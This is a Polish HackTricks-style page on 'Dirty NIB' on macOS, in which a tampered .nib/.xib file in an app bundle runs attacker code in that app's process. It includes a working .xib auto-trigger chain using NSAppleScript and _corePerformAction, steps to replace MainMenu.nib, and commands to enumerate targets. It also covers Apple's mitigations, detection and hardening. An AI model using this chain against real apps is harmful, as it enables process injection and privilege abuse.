# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB odnosi się do wykorzystywania plików Interface Builder (.xib/.nib) znajdujących się w podpisanym bundle aplikacji macOS w celu wykonania logiki kontrolowanej przez atakującego wewnątrz procesu docelowego, a tym samym odziedziczenia jego entitlements i uprawnień TCC. Technika ta została pierwotnie opisana przez xpn (MDSec), a następnie uogólniona i znacznie rozszerzona przez Sector7, który omówił również mitigations Apple w macOS 13 Ventura i macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Informacje wprowadzające i pogłębione analizy znajdują się w references na końcu.

> TL;DR
> • Przed macOS 13 Ventura: zastąpienie MainMenu.nib w bundle (lub innego nib ładowanego podczas uruchamiania) mogło niezawodnie umożliwić process injection i często privilege escalation.
> • Od macOS 13 (Ventura), a także po usprawnieniach w macOS 14 (Sonoma): weryfikacja podczas pierwszego uruchomienia, bundle protection, Launch Constraints oraz nowe uprawnienie TCC „App Management” w dużej mierze uniemożliwiają modyfikowanie nib po uruchomieniu przez niezależne aplikacje. Ataki mogą być nadal możliwe w niszowych przypadkach (np. gdy tooling tego samego developera modyfikuje własne aplikacje albo terminale otrzymały od użytkownika uprawnienie App Management/Full Disk Access).

## Czym są pliki NIB/XIB

Pliki Nib (skrót od NeXT Interface Builder) to serializowane grafy obiektów UI używane przez aplikacje AppKit. Współczesny Xcode przechowuje edytowalne pliki XML .xib, które podczas build są kompilowane do formatu .nib. Typowa aplikacja ładuje swój główny UI za pomocą `NSApplicationMain()`, który odczytuje klucz `NSMainNibFile` z pliku Info.plist aplikacji i podczas runtime tworzy instancje grafu obiektów.

Kluczowe elementy umożliwiające atak:
- Ładowanie NIB tworzy instancje dowolnych klas Objective-C bez wymogu zgodności z NSSecureCoding (loader nib Apple używa `init`/`initWithFrame:`, gdy `initWithCoder:` nie jest dostępne).
- Cocoa Bindings mogą zostać wykorzystane do wywoływania metod podczas tworzenia instancji nib, w tym wywołań łańcuchowych, które nie wymagają żadnej interakcji użytkownika.


## Proces Dirty NIB injection (z perspektywy atakującego)

Klasyczny przebieg sprzed Ventura:
1) Utworzenie złośliwego pliku .xib
- Dodaj obiekt `NSAppleScript` (lub inne klasy „gadget”, takie jak `NSTask`).
- Dodaj `NSTextField`, którego title zawiera payload (np. AppleScript lub argumenty polecenia).
- Dodaj co najmniej jeden obiekt `NSMenuItem` połączony za pomocą bindings z metodami obiektu docelowego.

2) Automatyczne wyzwolenie bez kliknięć użytkownika
- Użyj bindings do ustawienia target/selector elementu menu, a następnie wywołaj prywatną metodę `_corePerformAction`, aby akcja została automatycznie uruchomiona podczas ładowania nib. Eliminuje to konieczność klikania przycisku przez użytkownika.

Minimalny przykład łańcucha auto-trigger wewnątrz pliku .xib (skrócony dla przejrzystości):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Zapewnia to możliwość wykonywania dowolnego kodu AppleScript w procesie docelowym podczas ładowania nib.<sup>[[1]](#references)</sup> Zaawansowane łańcuchy mogą:
- Tworzyć dowolne klasy AppKit (np. `NSTask`) i wywoływać metody bez argumentów, takie jak `-launch`.
- Wywoływać dowolne selektory z argumentami będącymi obiektami za pomocą opisanego powyżej binding trick.
- Ładować AppleScriptObjC.framework w celu uzyskania dostępu do Objective-C, a nawet wywoływać wybrane API języka C.
- W starszych systemach, które nadal zawierają Python.framework, uzyskiwać dostęp do Pythona, a następnie używać `ctypes` do wywoływania dowolnych funkcji C (badania Sector7).<sup>[[2]](#references)</sup>

3) Zastąp nib aplikacji
- Skopiuj target.app do lokalizacji z możliwością zapisu, zastąp np. `Contents/Resources/MainMenu.nib` złośliwym nib i uruchom target.app. Przed Venturą, po jednorazowej ocenie przez Gatekeeper, kolejne uruchomienia wykonywały tylko pobieżne sprawdzenia podpisu, więc zasoby niebędące plikami wykonywalnymi (takie jak .nib) nie były ponownie weryfikowane.

Przykładowy payload AppleScript do widocznego testu:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Współczesne zabezpieczenia macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple wprowadziło kilka systemowych mechanizmów ograniczających, które znacząco zmniejszają skuteczność Dirty NIB we współczesnym macOS:<sup>[[2]](#references)</sup>
- Weryfikacja podczas pierwszego uruchomienia i ochrona bundle (macOS 13 Ventura)
- Przy pierwszym uruchomieniu dowolnej aplikacji (objętej kwarantanną lub nie) dokładna weryfikacja podpisu obejmuje wszystkie zasoby bundle. Następnie bundle zostaje objęty ochroną: tylko aplikacje od tego samego developera (lub jawnie dozwolone przez aplikację) mogą modyfikować jego zawartość. Inne aplikacje wymagają nowego uprawnienia TCC „App Management”, aby zapisywać w bundle innej aplikacji.
- Launch Constraints (macOS 13 Ventura)
- Aplikacji systemowych/Apple dołączonych do systemu nie można kopiować w inne miejsca i uruchamiać; eliminuje to podejście „skopiuj do /tmp, zmodyfikuj, uruchom” w przypadku aplikacji systemowych.
- Usprawnienia w macOS 14 Sonoma
- Apple zaostrzyło App Management i naprawiło znane obejścia (np. CVE‑2023‑40450) wskazane przez Sector7. Python.framework usunięto wcześniej (macOS 12.3), co przerwało niektóre łańcuchy privilege-escalation.
- Zmiany w Gatekeeper/Quarantine
- Szersze omówienie zmian w Gatekeeper, pochodzeniu plików i procesie assessment, które wpłynęły na tę technikę, znajduje się na stronie wskazanej poniżej.

> Praktyczne znaczenie
> • W Ventura+ zazwyczaj nie można modyfikować pliku .nib aplikacji third-party, chyba że proces ma App Management lub jest podpisany tym samym Team ID co cel (np. narzędzie developerskie).
> • Przyznanie powłokom/terminalom uprawnień App Management lub Full Disk Access skutecznie ponownie otwiera tę powierzchnię ataku dla wszystkiego, co może wykonywać code w kontekście tego terminala.


### Rozwiązywanie problemu Launch Constraints

Launch Constraints blokują uruchamianie wielu aplikacji Apple z lokalizacji innych niż domyślne, począwszy od Ventura. Jeśli korzystasz ze starszych workflow, takich jak skopiowanie aplikacji Apple do katalogu tymczasowego, zmodyfikowanie `MainMenu.nib` i jej uruchomienie, oczekuj, że nie zadziała to w wersji >= 13.0.


## Enumerowanie celów i nibów (przydatne w badaniach / starszych systemach)

- Zlokalizuj aplikacje, których UI jest sterowany przez nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Znajdź potencjalne zasoby nib wewnątrz bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Dokładnie weryfikuj podpisy kodu (weryfikacja zakończy się niepowodzeniem, jeśli zmodyfikowano zasoby i nie podpisano ich ponownie):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Uwaga: W nowoczesnym macOS podczas próby zapisu do pakietu innej aplikacji bez odpowiedniej autoryzacji zostaniesz również zablokowany przez ochronę pakietów/TCC.


## Wskazówki dotyczące wykrywania i DFIR

- Monitorowanie integralności plików zasobów pakietów
- Obserwuj zmiany mtime/ctime w `Contents/Resources/*.nib` oraz innych niebędących plikami wykonywalnymi zasobach zainstalowanych aplikacji.
- Unified logs i zachowanie procesów
- Monitoruj nieoczekiwane wykonywanie AppleScript wewnątrz aplikacji GUI oraz procesy ładujące AppleScriptObjC lub Python.framework. Przykład:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktywne oceny
- Okresowo uruchamiaj `codesign --verify --deep` dla krytycznych aplikacji, aby upewnić się, że zasoby pozostają nienaruszone.
- Kontekst uprawnień
- Przeprowadź audyt tego, kto lub co ma uprawnienie TCC „App Management” lub Full Disk Access (szczególnie terminale i agenty zarządzania). Usunięcie tych uprawnień z powłok ogólnego przeznaczenia zapobiega trywialnemu ponownemu włączaniu manipulacji w stylu Dirty NIB.


## Wzmacnianie zabezpieczeń (deweloperzy i obrońcy)

- Preferuj programistyczny interfejs użytkownika lub ogranicz to, co jest tworzone na podstawie nibów. Unikaj dołączania potężnych klas (np. `NSTask`) do grafów nibów oraz bindingów, które pośrednio wywołują selektory na dowolnych obiektach.
- Stosuj hardened runtime z Library Validation (jest to już standard w nowoczesnych aplikacjach). Chociaż samo to nie zatrzymuje wstrzykiwania nibów, blokuje łatwe ładowanie natywnego kodu i zmusza atakujących do korzystania wyłącznie z payloadów skryptowych.
- Nie żądaj szerokich uprawnień App Management w narzędziach ogólnego przeznaczenia ani nie polegaj na nich. Jeśli MDM wymaga App Management, odseparuj ten kontekst od powłok obsługiwanych przez użytkownika.
- Regularnie weryfikuj integralność pakietu swojej aplikacji, a mechanizmy aktualizacji projektuj tak, aby automatycznie przywracały zasoby pakietu.


## Powiązane materiały w HackTricks

Dowiedz się więcej o Gatekeeper, kwarantannie i zmianach pochodzenia, które wpływają na tę technikę:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Odnośniki

- [1] [xpn – DirtyNIB (oryginalny opis z przykładem Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 kwietnia 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
